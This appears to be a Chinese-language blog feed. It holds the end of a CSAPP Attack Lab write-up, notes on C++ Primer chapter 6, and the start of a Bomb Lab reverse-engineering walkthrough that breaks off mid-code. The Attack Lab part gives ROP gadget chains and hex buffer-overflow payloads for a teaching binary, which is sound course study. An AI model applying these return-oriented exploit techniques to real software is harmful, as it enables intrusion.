class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">popq %rax</span><br><span class="line">movq %rax, %rdi</span><br></pre></td></tr></table></figure><blockquote><p>💡 ROP的<strong>pipeline：先自己写汇编语言，根据所需机器码去程序中进行搜索。</strong><br>这里选用rax的原因是：产看rtarget反汇编代码，发现 <code>start_farm</code> 到 <code>mid_farm</code> 区间内主要涉及rax和rdi。</p></blockquote><p>其中 <code>popq %rax</code> 对应的机器码为 <code>58</code>，<code>movq %rax, %rdi</code> 对应的机器码为 <code>48 89 c7</code>。在 <code>start_farm</code> 中搜索包含这个机器码。</p><p>可以找到 <code>addval_219</code> 和 <code>getval_280</code> 中的 <code>58</code> 后面接的不是 <code>90</code> （对应 <code>nop</code> 指令）就是 <code>c3</code>（对应 <code>ret</code> 指令），可以用于构造 gadget，地址为 <code>0x4019ab</code> 或者 <code>0x4019cc</code>。而 <code>addval_273</code> 和 <code>setvak_426</code> 中的 <code>48 89 c7</code> 也满足条件，地址为 <code>0x4019a2</code> 或者 <code>0x4019c5</code>。</p><p><img src="/2023/06/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l3-attacklab/2065884-20220515163146729-1696139642.png" alt></p><p>根据上述分析，可以得到字符串的十六进制为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30</span><br><span class="line">ab 19 40 00 00 00 00 00 /* ret-address -&gt; addval_219: popq %rax */</span><br><span class="line">fa 97 b9 59 00 00 00 00 /* cookie: 0x59b997fa */</span><br><span class="line">c5 19 40 00 00 00 00 00 /* setval_426: movq %rax, %rdi */</span><br><span class="line">ec 17 40 00 00 00 00 00 /* touch2 地址 */</span><br></pre></td></tr></table></figure><p>填充 buf 覆盖掉返回地址，使得返回地址为 <code>addval_219</code> 的地址。</p><h2 id="Level-3-2"><strong>Level 3</strong></h2><ul><li>You have also gotten 95/100 points for the lab. That’s a good score. If you have other pressing obligations consider stopping right now.</li></ul><p>Level 3 同样要求使用 ROP 攻击跳转到 <code>touch3</code> 并执行 if 分支，本次传递给 <code>%rdi</code> 的是字符串的地址，受到栈随机化的影响，缓冲区的起始地址一直在变化，所以不能将字符串的地址直接写入缓冲区。但是 <code>%rsp</code> 里面存储了地址，如果我们给这个地址加上一个偏差量，就能得到 <code>cookie</code> 字符串的地址了。</p><ul><li>因为开启了栈随机化，所以不能直接把代码插入到绝对地址，必须找一个基准，我们就只能找%rsp。</li><li>因为touch3会开辟一个很大的buffsize，若把数据插到touch3下面的栈空间，有关内存之后基本就会被重写，所以要存在touch3的更高地址处。</li><li>所以要在%rsp上加一个bias才可以，即字符串地址是%rsp + bias。没有直接的加法指令，那就找两个寄存器互相加，找到一个放在下面：  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000000042 &lt;add_xy&gt;:</span><br><span class="line">  42:48 8d 04 37          lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  46:c3                   retq</span><br></pre></td></tr></table></figure></li></ul><p>实现上述想法最直白的汇编代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movq $rsp, %rdi</span><br><span class="line">popq %rsi</span><br><span class="line">callq 0x401d6&lt;add_xy&gt;</span><br><span class="line">movq %rax, %rdi</span><br></pre></td></tr></table></figure><p>可惜不是每一条指令的机器码都能在 <code>start_farm</code> 到 <code>end_farm</code> 之间找到并构造出 gadget，所以需要稍微绕点远路，结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">movq %rsp, %rax</span><br><span class="line">movq %rax, %rdi</span><br><span class="line">popq %rax</span><br><span class="line">movl %eax, %edx</span><br><span class="line">movl %edx, %ecx</span><br><span class="line">movl %ecx, %esi</span><br><span class="line">callq 0x4019d6&lt;add_xy&gt;</span><br><span class="line">movq $rsp, %rdi</span><br></pre></td></tr></table></figure><p>根据上述汇编代码的机器码地址可以得到输入字符串的十六进制为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30</span><br><span class="line">06 1a 40 00 00 00 00 00     /* addval_190: movq %rsp, %rax */</span><br><span class="line">a2 19 40 00 00 00 00 00     /* addval_273: movq %rax, %rdi */</span><br><span class="line">ab 19 40 00 00 00 00 00     /* addval_219: popq %rax */</span><br><span class="line">48 00 00 00 00 00 00 00     /* 偏移地址 */</span><br><span class="line">dd 19 40 00 00 00 00 00     /* getval_481: movl %eax, %edx */</span><br><span class="line">69 1a 40 00 00 00 00 00     /* getval_311: movl %edx, %ecx */</span><br><span class="line">13 1a 40 00 00 00 00 00     /* addval_436: movl %ecx, %six */</span><br><span class="line">d6 19 40 00 00 00 00 00     /* &lt;add_xy&gt; */</span><br><span class="line">c5 19 40 00 00 00 00 00     /* setval_426: movq %rax, %rdi */</span><br><span class="line">fa 18 40 00 00 00 00 00     /* touch3 地址 */</span><br><span class="line">35 39 62 39 39 37 66 61 00  /* cookie: 0x59b997fa */</span><br></pre></td></tr></table></figure><h1 id="参考资料">参考资料</h1><ul><li><a href="https://www.cnblogs.com/zhiyiYo/p/16274591.html">https://www.cnblogs.com/zhiyiYo/p/16274591.html</a></li><li>CSAPP实验之attack lab - 林恩LeyN的文章 - 知乎 <a href="https://zhuanlan.zhihu.com/p/60724948">https://zhuanlan.zhihu.com/p/60724948</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第6章 函数</title>
      <link href="/2023/06/01/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch06/"/>
      <url>/2023/06/01/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch06/</url>
      
        <content type="html"><![CDATA[<h2 id="函数基础">函数基础</h2><ul><li><strong>函数定义</strong>：包括返回类型、函数名字和0个或者多个<strong>形参</strong>（parameter）组成的列表和函数体。</li><li><strong>调用运算符</strong>：调用运算符的形式是一对圆括号 <code>()</code>，作用于一个表达式，该表达式是函数或者指向函数的指针。</li><li>圆括号内是用逗号隔开的<strong>实参</strong>（argument）列表。</li><li>函数调用过程：<ul><li>1.主调函数（calling function）的执行被中断。</li><li>2.被调函数（called function）开始执行。</li></ul></li><li><strong>形参和实参</strong>：形参和实参的<strong>个数</strong>和<strong>类型</strong>必须匹配上。</li><li><strong>返回类型</strong>： <code>void</code>表示函数不返回任何值。函数的返回类型不能是数组类型或者函数类型，但可以是指向数组或者函数的指针。</li><li><strong>名字</strong>：名字的作用于是程序文本的一部分，名字在其中可见。</li></ul><h3 id="局部对象">局部对象</h3><p>两个重要的概念：名字的作用域和对象的生命周期。</p><ul><li><strong>生命周期</strong>：对象的生命周期是程序执行过程中该对象存在的一段时间。</li><li><strong>局部变量</strong>（local variable）：形参和函数体内部定义的变量统称为局部变量。它对函数而言是局部的，对函数外部而言是<strong>隐藏</strong>的，还会隐藏在外层作用域中同名的其他所有声明。</li><li><strong>自动对象</strong>：只存在于块执行期间的对象。当块的执行结束后，它的值就变成<strong>未定义</strong>的了。</li><li><strong>局部静态对象</strong>： <code>static</code>类型的局部变量，生命周期贯穿函数调用前后，若没有显式的初始化值，则将执行<strong>值初始化</strong>（3.3.1节）。</li></ul><h3 id="函数声明">函数声明</h3><ul><li><strong>函数声明</strong>：函数的声明和定义唯一的区别是声明无需函数体，用一个分号替代。函数声明主要用于描述函数的接口，也称<strong>函数原型</strong>。</li><li><strong>在头文件中进行函数声明</strong>：建议变量在头文件中声明；在源文件中定义。</li><li><strong>分离编译</strong>： <code>CC a.cc b.cc</code>直接编译生成可执行文件；<code>CC -c a.cc b.cc</code>编译生成对象代码<code>a.o b.o</code>； <code>CC a.o b.o</code>编译生成可执行文件。</li></ul><h2 id="参数传递">参数传递</h2><ul><li><p>形参初始化的机理和变量初始化一样。</p></li><li><p><strong>引用传递</strong>（passed by reference）：又称传引用调用（called by reference），指<strong>形参是引用类型</strong>，引用形参是它对应的实参的别名。</p><blockquote><p>表述：将引用形参绑定到实参上。</p></blockquote></li><li><p><strong>值传递</strong>（passed by value）：又称传值调用（called by value），指实参的值是通过<strong>拷贝</strong>传递给形参。</p></li></ul><h3 id="传值参数">传值参数</h3><ul><li>当初始化一个非引用类型的变量时，初始值被拷贝给变量。</li><li>函数对形参做的所有操作都不会影响实参。</li><li><strong>指针形参</strong>：常用在C中，<code>C++</code>建议使用引用类型的形参代替指针。</li></ul><h3 id="传引用参数">传引用参数</h3><ul><li>通过使用引用形参，允许函数改变一个或多个实参的值。</li><li>引用形参直接关联到绑定的对象，而非对象的副本。</li><li>使用引用形参可以用于<strong>返回额外的信息</strong>。</li><li>经常用引用形参来避免不必要的复制。</li><li><code>void swap(int &amp;v1, int &amp;v2)</code></li><li>如果无需改变引用形参的值，最好将其声明为常量引用。</li></ul><h3 id="const形参和实参">const形参和实参</h3><ul><li>形参的顶层<code>const</code>被忽略。<code>void func(const int i);</code>调用时既可以传入<code>const int</code>也可以传入<code>int</code>。</li><li>我们可以使用非常量初始化一个底层<code>const</code>对象，但是反过来不行。</li><li>在函数中，不能改变实参的<strong>局部副本</strong>。</li><li>尽量使用常量引用。</li></ul><h3 id="数组形参">数组形参</h3><ul><li>当我们为函数传递一个数组时，实际上传递的是指向数组首元素的指针。</li><li>要注意数组的实际长度，不能越界。</li><li>数组引用形参：<code>void print(int (&amp;arr)[10]);</code>。</li><li>传递多维数组时，数组第二维（以及后面所有维度）的大小都是数组类型的一部分，不能省略：<code>void print(int (&amp;mat)[10], int rowSize);</code> 或 <code>void print(int mat[][10], int rowSize);</code>。</li></ul><h3 id="main处理命令行选项">main处理命令行选项</h3><ul><li><p><code>int main(int argc, char *argv[])&#123;...&#125;</code></p></li><li><p>第一个形参代表参数的个数；第二个形参是参数C风格字符串数。</p><blockquote><p>可选实参从argv[1]开始，argv[0]保存程序的名字。</p></blockquote></li></ul><h3 id="可变形参">可变形参</h3><p><code>initializer_list</code>提供的操作（<code>C++11</code>）：</p><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>initializer_list&lt;T&gt; lst;</code></td><td>默认初始化；<code>T</code>类型元素的空列表</td></tr><tr><td><code>initializer_list&lt;T&gt; lst&#123;a,b,c...&#125;;</code></td><td><code>lst</code>的元素数量和初始值一样多；<code>lst</code>的元素是对应初始值的<strong>副本</strong>；列表中的元素是<code>const</code>。</td></tr><tr><td><code>lst2(lst)</code></td><td>拷贝或赋值一个<code>initializer_list</code>对象不会拷贝列表中的元素；拷贝后，原始列表和副本共享元素。</td></tr><tr><td><code>lst2 = lst</code></td><td>同上</td></tr><tr><td><code>lst.size()</code></td><td>列表中的元素数量</td></tr><tr><td><code>lst.begin()</code></td><td>返回指向<code>lst</code>中首元素的指针</td></tr><tr><td><code>lst.end()</code></td><td>返回指向<code>lst</code>中微元素下一位置的指针</td></tr></tbody></table><p><code>initializer_list</code>使用demo：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">err_msg</span><span class="params">(ErrCode e, initializer_list&lt;string&gt; il)</span></span>&#123;</span><br><span class="line">    cout &lt;&lt; e.msg &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> bed = il.<span class="built_in">begin</span>(); beg != il.<span class="built_in">end</span>(); ++ beg)</span><br><span class="line">        cout &lt;&lt; *beg &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">err_msg</span>(<span class="built_in">ErrCode</span>(<span class="number">0</span>), &#123;<span class="string">&quot;functionX&quot;</span>, <span class="string">&quot;okay&#125;);</span></span><br></pre></td></tr></table></figure><ul><li><p>所有实参类型相同但数量未知，可以使用 <code>initializer_list</code>的标准库类型。</p></li><li><p>实参类型不同，可以使用<code>可变参数模板</code>。</p></li><li><p>省略形参符： <code>...</code>，便于<code>C++</code>访问某些C代码，这些C代码使用了 <code>varargs</code>的C标准功能。</p><blockquote><p>省略符形参应当仅用于C和C++通用的类型。<br>大多数类型的对象在传递给省略符形参时都无法正确拷贝。</p></blockquote></li></ul><h2 id="返回类型和return语句">返回类型和return语句</h2><h3 id="无返回值函数">无返回值函数</h3><p>没有返回值的 <code>return</code>语句只能用在返回类型是 <code>void</code>的函数中，返回 <code>void</code>的函数不要求非得有 <code>return</code>语句。</p><h3 id="有返回值函数">有返回值函数</h3><ul><li><p><code>return</code>语句的返回值的类型必须和函数的返回类型相同，或者能够<strong>隐式地</strong>转换成函数的返回类型。</p></li><li><p>值的返回：返回的值用于初始化调用点的一个<strong>临时量</strong>，该临时量就是函数调用的结果。</p></li><li><p><strong>不要返回局部对象的引用或指针</strong>。</p></li><li><p><strong>引用返回左值</strong>：函数的返回类型决定函数调用是否是左值。<strong>调用一个返回引用的函数得到左值</strong>；其他返回类型得到右值。</p></li><li><p><strong>列表初始化返回值</strong>：函数可以返回花括号包围的值的列表。（<code>C++11</code>）</p><blockquote><p>如果列表为空，临时值执行值初始化；否则返回值由返回类型决定。</p></blockquote></li><li><p><strong>主函数main的返回值</strong>：如果结尾没有<code>return</code>，编译器将隐式地插入一条返回0的<code>return</code>语句。返回0代表执行成功。</p></li></ul><h3 id="返回数组指针">返回数组指针</h3><ul><li><code>Type (*function (parameter_list))[dimension]</code></li><li>使用类型别名： <code>typedef int arrT[10];</code> 或者 <code>using arrT = int[10;]</code>，然后 <code>arrT* func() &#123;...&#125;</code></li><li>使用 <code>decltype</code>： <code>decltype(odd) *arrPtr(int i) &#123;...&#125;</code></li><li><strong>尾置返回类型</strong>： 在形参列表后面以一个<code>-&gt;</code>开始：<code>auto func(int i) -&gt; int(*)[10]</code>（<code>C++11</code>）</li></ul><h2 id="函数重载">函数重载</h2><ul><li><p><strong>重载</strong>：如果同一作用域内几个函数名字相同但形参列表不同，我们称之为重载（overload）函数。</p></li><li><p><code>main</code>函数不能重载。</p></li><li><p><strong>重载和const形参</strong>：</p><ul><li>一个有顶层const的形参和没有它的函数无法区分。 <code>Record lookup(Phone* const)</code>和 <code>Record lookup(Phone*)</code>无法区分。</li><li>相反，是否有某个底层const形参可以区分。 <code>Record lookup(Account*)</code>和 <code>Record lookup(const Account*)</code>可以区分。</li></ul></li><li><p><strong>重载和作用域</strong>：若在内层作用域中声明名字，它将隐藏外层作用域中声明的同名实体，在不同的作用域中无法重载函数名。</p><blockquote><p>C++中，名字查找发生在类型检查之前。</p></blockquote></li></ul><h2 id="特殊用途语言特性">特殊用途语言特性</h2><h3 id="默认实参">默认实参</h3><ul><li><code>string screen(sz ht = 24, sz wid = 80, char backgrnd = ' ');</code></li><li>一旦某个形参被赋予了默认值，那么它之后的形参都必须要有默认值。</li></ul><h3 id="内联（inline）函数">内联（inline）函数</h3><ul><li><p>普通函数的缺点：调用函数比求解等价表达式要慢得多。</p></li><li><p><code>inline</code>函数可以避免函数调用的开销，可以让编译器在编译时<strong>内联地展开</strong>该函数。</p><blockquote><p>内联说明只是向编译器提出一个请求，编译器可以忽略这个请求。</p></blockquote></li><li><p><code>inline</code>函数应该在头文件中定义。</p></li></ul><h3 id="constexpr函数">constexpr函数</h3><ul><li><p>指能用于常量表达式的函数。</p><blockquote><p>常量表达式是<strong>值不会改变</strong>且在<strong>编译过程</strong>中就能知道其值的表达式。<br>constexpr函数不一定返回常量表达式。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">constexpr</span> <span class="type">size_t</span> <span class="title">scale</span><span class="params">(<span class="type">size_t</span> cnt)</span> </span>&#123;<span class="keyword">return</span> <span class="built_in">new_sz</span>() * cnt;&#125;</span><br><span class="line"><span class="comment">// 当scale的实参是常量表达式时，scale(arg)才是常量表达式。</span></span><br></pre></td></tr></table></figure></blockquote></li><li><p><code>constexpr int new_sz() &#123;return 42;&#125;</code></p></li><li><p>函数的返回类型及所有形参类型都要是字面值类型。</p></li><li><p><code>constexpr</code>函数应该在头文件中定义。</p></li></ul><h3 id="调试帮助">调试帮助</h3><ul><li><code>assert</code>预处理宏（preprocessor macro）：<code>assert(expr);</code></li></ul><p>开关调试状态：</p><p><code>CC -D NDEBUG main.c</code>可以定义这个变量<code>NDEBUG</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="keyword">ifndef</span> NDEBUG</span></span><br><span class="line">        cerr &lt;&lt; __func__ &lt;&lt; <span class="string">&quot;...&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="函数匹配">函数匹配</h2><ul><li>重载函数匹配的<strong>三个步骤</strong>：1.候选函数；2.可行函数；3.寻找最佳匹配。</li><li><strong>候选函数</strong>：选定本次调用对应的重载函数集，集合中的函数称为候选函数（candidate function）。</li><li><strong>可行函数</strong>：考察本次调用提供的实参，选出可以被这组实参调用的函数，新选出的函数称为可行函数（viable function）。</li><li><strong>寻找最佳匹配</strong>：基本思想：实参类型和形参类型越接近，它们匹配地越好。</li><li>调用重载函数时应尽量避免强制类型转换。如果在实际应用中确实需要强制类型转换，则说明我们设计的行参集合不合理。</li></ul><h2 id="函数指针">函数指针</h2><ul><li><p><strong>函数指针</strong>：是指向函数的指针。</p><blockquote><p>函数类型由返回类型何形参类型共同决定，与函数名无关。<br>指向不同函数类型的指针间不能转换。</p></blockquote></li><li><p><code>bool (*pf)(const string &amp;, const string &amp;);</code> 注：两端的括号不可少。</p></li><li><p><strong>函数指针形参</strong>：</p><ul><li><p>形参中使用函数定义或者函数指针定义效果一样。</p></li><li><p>使用类型别名或者<code>decltype</code>。</p><blockquote><p>注意：<code>decltype</code>返回函数类型时不会将函数类型自动转换成指针类型。</p></blockquote></li></ul></li><li><p><strong>返回指向函数的指针</strong>：</p><ul><li><p>类型别名</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> F = <span class="built_in">int</span>(<span class="type">int</span>*, <span class="type">int</span>);  <span class="comment">// F是函数类型</span></span><br><span class="line"><span class="keyword">using</span> PF = <span class="built_in">int</span>(*)(<span class="type">int</span> *)(<span class="type">int</span>);  <span class="comment">// PF是指针类型</span></span><br><span class="line"><span class="function">F *<span class="title">f1</span><span class="params">(<span class="type">int</span>)</span></span>;</span><br><span class="line"><span class="function">PF <span class="title">f1</span><span class="params">(<span class="type">int</span>)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>直接声明或尾置返回类型：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> (*<span class="built_in">f1</span>(<span class="type">int</span>))(<span class="type">int</span>*, <span class="type">int</span>);  <span class="comment">// 直接声明式</span></span><br><span class="line"><span class="function"><span class="keyword">auto</span> <span class="title">f1</span><span class="params">(<span class="type">int</span>)</span> -&gt; <span class="title">int</span><span class="params">(*)</span><span class="params">(<span class="type">int</span>*, <span class="type">int</span>)</span>  <span class="comment">// 等效尾置返回类型</span></span></span><br></pre></td></tr></table></figure></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 《C++ Primer 5th》 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP - Bomb Lab 详解</title>
      <link href="/2023/05/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l2-bomblab/"/>
      <url>/2023/05/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l2-bomblab/</url>
      
        <content type="html"><![CDATA[<p><a href="https://csapp.cs.cmu.edu/im/labs/bomblab.tar"><em>Bomb Lab</em></a> <em>[Updated 1/12/16]</em> (<a href="http://csapp.cs.cmu.edu/3e/README-bomblab">README</a>, <a href="http://csapp.cs.cmu.edu/3e/bomblab.pdf">Writeup</a>, <a href="http://csapp.cs.cmu.edu/3e/bomblab-release.html">Release Notes</a>, <a href="http://csapp.cs.cmu.edu/3e/bomb.tar">Self-Study Handout</a>)</p><blockquote><p>A “binary bomb” is a program provided to students as an object code file. When run, it prompts the user to type in 6 different strings. If any of these is incorrect, the bomb “explodes,” printing an error message and logging the event on a grading server. Students must “defuse” their own unique bomb by disassembling and reverse engineering the program to determine what the 6 strings should be. The lab teaches students to understand assembly language, and also forces them to learn how to use a debugger. It’s also great fun. A legendary lab among the CMU undergrads.</p><p>Here’s a <a href="http://csapp.cs.cmu.edu/3e/bomb.tar">Linux/x86-64 binary bomb</a> that you can try out for yourself. The feature that notifies the grading server has been disabled, so feel free to explode this bomb with impunity. If you’re an instructor with a CS:APP account, then you can download the <a href="http://csapp.cs.cmu.edu/im/bomb-solution.txt">solution</a>.</p></blockquote><p>实验作业网址：<a href="http://csapp.cs.cmu.edu/3e/labs.html">http://csapp.cs.cmu.edu/3e/labs.html</a></p><h1 id="前言">前言</h1><p>本篇博客将会展示 CSAPP 之 BombLab 的拆弹过程，粉碎 Dr.Evil 的邪恶阴谋。Dr.Evil 总共设置了 6 个炸弹，每个炸弹对应一串字符串，如果字符串错误，炸弹就会被引爆。本 lab 主题为逆向工程，涉及主题包括 switch 结构、数组哈希、链表、二叉树数据结构的逆向，以及简单控制流、二分算法等的逆向。</p><hr><p>网上许多教程都是基于naive gdb来做的，但Beej’s <a href="http://beej.us/guide/bggdb/">Quick Guide to GDB</a>中作者都说从来不会直接使用普通模式的gdb。<br>本文基于IDA pro和pwndbg：</p><ul><li>IDA：强大的反汇编（反编译）工具，指令流图和F5反编译用起来太爽啦。</li><li>pwndbg：gdb的插件，可以在调试时显示寄存器、指令列表、栈、backstrace等信息和辅助提示信息。</li></ul><p>注意：</p><ul><li>pwndbg与naive gdb使用上有些不同，比如不能使用<code>disas</code> ，得用<code>disassemble</code> ，输出的格式也不是gdb默认的AT&amp;T格式，而是intel格式，这与IDA反汇编格式相同，看起来更方便。</li><li>使用naive gdb对熟练gdb很有好处，但作为使用十个手指的人类，我还是更喜欢看IDA强大的反编译工具，和pwndbg辅助插件。</li><li></li></ul><h1 id="phase-1">phase_1</h1><aside>💡 x86_64 linux 通过 rdi, rsi 分别传入函数参数</aside><p><code>pwndbg&gt;disassemble main</code> 可以看到main()函数<strong>反汇编</strong>结果，可以观察到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400e32 &lt;+146&gt;:   call   0x40149e &lt;read_line&gt;</span><br><span class="line">0x0000000000400e37 &lt;+151&gt;:   mov    rdi,rax</span><br><span class="line">0x0000000000400e3a &lt;+154&gt;:   call   0x400ee0 &lt;phase_1&gt;</span><br><span class="line">0x0000000000400e3f &lt;+159&gt;:   call   0x4015c4 &lt;phase_defused&gt;</span><br></pre></td></tr></table></figure><p>read_line的返回值rax是读入的字符串地址，传给了rdi，应当是要作为phase_1的参数，里面存放的是我们的输入值。查看phase_1的反汇编代码，可知正确答案放在0x401338的位置，赋给esi后作为<code>strings_not_equal</code>函数的参数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────────────────────────────────────────────────────────[ DISASM / x86<span class="number">-64</span> / set emulate on ]───────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">0x400ee0</span> &lt;phase_1&gt;       sub    rsp, <span class="number">8</span></span><br><span class="line">   <span class="number">0x400ee4</span> &lt;phase_1+<span class="number">4</span>&gt;     mov    esi, <span class="number">0x402400</span></span><br><span class="line"> ► <span class="number">0x400ee9</span> &lt;phase_1+<span class="number">9</span>&gt;     call   strings_not_equal                      &lt;strings_not_equal&gt;</span><br><span class="line">        rdi: <span class="number">0x603780</span> (input_strings) ◂— <span class="number">0x363636616b6a</span> <span class="comment">/* &#x27;jka666&#x27; */</span></span><br><span class="line">        rsi: <span class="number">0x402400</span> ◂— outsd dx, dword ptr [rsi] <span class="comment">/* &#x27;Border relations with Canada have never been better.&#x27; */</span></span><br><span class="line">        rdx: <span class="number">0x1</span></span><br><span class="line">        rcx: <span class="number">0x6</span></span><br></pre></td></tr></table></figure><p>IDA pro反编译结果：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">phase_1</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="built_in">strings_not_equal</span>(a1, <span class="string">&quot;Border relations with Canada have never been better.&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result )</span><br><span class="line">    <span class="built_in">explode_bomb</span>(a1, <span class="string">&quot;Border relations with Canada have never been better.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="phase-2">phase_2</h1><p>使用IDA pro 对<code>phase_2()</code>和<code>read_six_numbers()</code>的<strong>反编译</strong>结果：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">phase_2</span><span class="params">(__int64 a1)</span>  <span class="comment">// a1 = RDI = RAX 是readline的返回字符串地址</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+0h] [rbp-38h] BYREF  // 特意将6字节数组表示为3个变量</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+4h] [rbp-34h] BYREF  // 方便循环特殊情况表示</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+18h] [rbp-20h] BYREF //</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">read_six_numbers</span>(a1, &amp;v3);  <span class="comment">// read_six_number会将读入结果放到rsp往后18h=24个字节</span></span><br><span class="line">  <span class="keyword">if</span> ( v3 != <span class="number">1</span> )  <span class="comment">// 首元素需为1</span></span><br><span class="line">    <span class="built_in">explode_bomb</span>(a1, &amp;v3);</span><br><span class="line">  v2 = &amp;v4;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">2</span> * *((_DWORD *)v2 - <span class="number">1</span>));  <span class="comment">// result = 2*arr[i-1]</span></span><br><span class="line">    